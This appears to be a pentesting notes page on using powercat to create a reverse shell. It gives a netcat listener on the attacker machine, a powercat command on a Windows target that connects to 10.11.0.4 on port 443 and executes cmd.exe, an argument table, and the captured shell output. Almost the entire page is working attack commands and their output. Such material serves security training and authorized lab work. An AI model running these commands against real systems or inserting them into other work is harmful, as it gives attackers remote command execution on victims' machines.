---
description: Utilizing powercat to create reverse shells
---

# Powercat

## Basic Reverse Shell

Reverse shell is fairly similar to the other tools listed.

### Attacker Machine

Powercat shells can be caught with netcat if desired.

```bash
kali@kali:~$ sudo nc -lvp 443
listening on [any] 443 ...
```

### Target Machine

```powershell
PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe
```

| Argument    | Description                                           |
| ----------- | ----------------------------------------------------- |
| `-c {IP}`   | Specifies **IP address** for connection               |
| `-p {PORT}` | Specifies the **port** for connection                 |
| `-e {APP}`  | Application that will be **executed** upon connection |

The shell will be received as a PowerShell instance on the **listener**

```bash
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 63699
Microsoft Windows [Version 10.0.17134.590]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\offsec>
```
